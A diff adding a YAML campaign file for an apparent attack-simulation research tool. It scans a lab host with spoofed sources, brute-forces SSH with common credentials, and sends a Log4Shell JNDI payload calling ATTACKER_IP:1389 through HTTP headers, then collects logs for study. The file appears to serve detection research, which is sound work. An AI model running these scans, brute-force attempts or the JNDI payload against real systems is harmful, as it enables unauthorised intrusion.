@@ -1,0 +1,118 @@
+campaign:
+  name: "Recon → SSH Brute Force → Log4Shell"
+  description: "Multi-phase attack simulation with non-stationary timing profiles"
+  seed: 42
+
+  target:
+    host: "192.168.2.201"
+    ssh_user: "researcher"
+    ssh_key: "~/.ssh/isildur_research"
+
+  phases:
+    - name: "Network Reconnaissance"
+      module: "recon"
+      mitre_technique: "T1046"
+      mitre_tactic: "TA0043"
+      attack_type: "discovery"
+      attack_stage: "recon"
+      severity: 1
+      params:
+        ports: [22, 80, 443, 8080, 3306, 5432]
+        scan_type: "syn"
+      ip_source:
+        strategy: "spoofed"
+        count: 500
+        subnet: "10.0.0.0/8"
+      timing:
+        duration_seconds: 300
+        profile: "constant"
+        jitter_ms: [50, 500]
+        delay_after_seconds: 30
+
+    - name: "SSH Brute Force"
+      module: "ssh_brute_force"
+      mitre_technique: "T1110.001"
+      mitre_tactic: "TA0006"
+      attack_type: "brute_force"
+      attack_stage: "initial_access"
+      severity: 2
+      params:
+        usernames: ["root", "admin", "user", "test"]
+        passwords: ["password", "123456", "admin", "root", "letmein"]
+        max_attempts_per_ip: 5
+        target_port: 22
+      ip_source:
+        strategy: "aliased"
+        count: 50
+        subnet: "192.168.2.0/24"
+        start_offset: 100
+        interface: "en0"
+      timing:
+        duration_seconds: 600
+        delay_after_seconds: 60
+        profile: "accelerating"
+        profile_params:
+          phases:
+            - label: "cautious"
+              fraction: 0.3
+              jitter_ms: [2000, 5000]
+            - label: "aggressive"
+              fraction: 0.5
+              jitter_ms: [100, 500]
+            - label: "burst"
+              fraction: 0.2
+              jitter_ms: [20, 100]
+
+    - name: "Log4Shell Exploitation"
+      module: "log4shell"
+      mitre_technique: "T1190"
+      mitre_tactic: "TA0001"
+      attack_type: "web_exploit"
+      attack_stage: "initial_access"
+      severity: 3
+      params:
+        target_port: 8080
+        path: "/"
+        jndi_string: "${jndi:ldap://ATTACKER_IP:1389/exploit}"
+        injection_headers: ["X-Api-Version", "User-Agent", "Referer"]
+        num_requests: 100
+      ip_source:
+        strategy: "aliased"
+        count: 20
+        subnet: "192.168.2.0/24"
+        start_offset: 150
+        interface: "en0"
+      timing:
+        duration_seconds: 120
+        profile: "decelerating"
+        profile_params:
+          phases:
+            - label: "spray"
+              fraction: 0.4
+              jitter_ms: [100, 300]
+            - label: "targeted"
+              fraction: 0.6
+              jitter_ms: [2000, 5000]
+
+  collection:
+    log_sources:
+      - name: "auth_log"
+        remote_path: "/var/log/auth.log"
+        parser: "auth_log"
+      - name: "syslog"
+        remote_path: "/var/log/syslog"
+        parser: "syslog"
+      - name: "web_access"
+        remote_path: "/var/log/nginx/access.log"
+        parser: "web_access"
+      - name: "web_error"
+        remote_path: "/var/log/nginx/error.log"
+        parser: "web_error"
+      - name: "journal"
+        remote_command: "journalctl --since '{start_time}' --until '{end_time}' -o json"
+        parser: "journal"
+      - name: "auditd"
+        remote_command: "ausearch -k research_exploit --start {start_time_audit} --end {end_time_audit} --interpret --format text"
+    output:
+      db_path: "data/campaigns.db"
+      time_buffer_seconds: 60
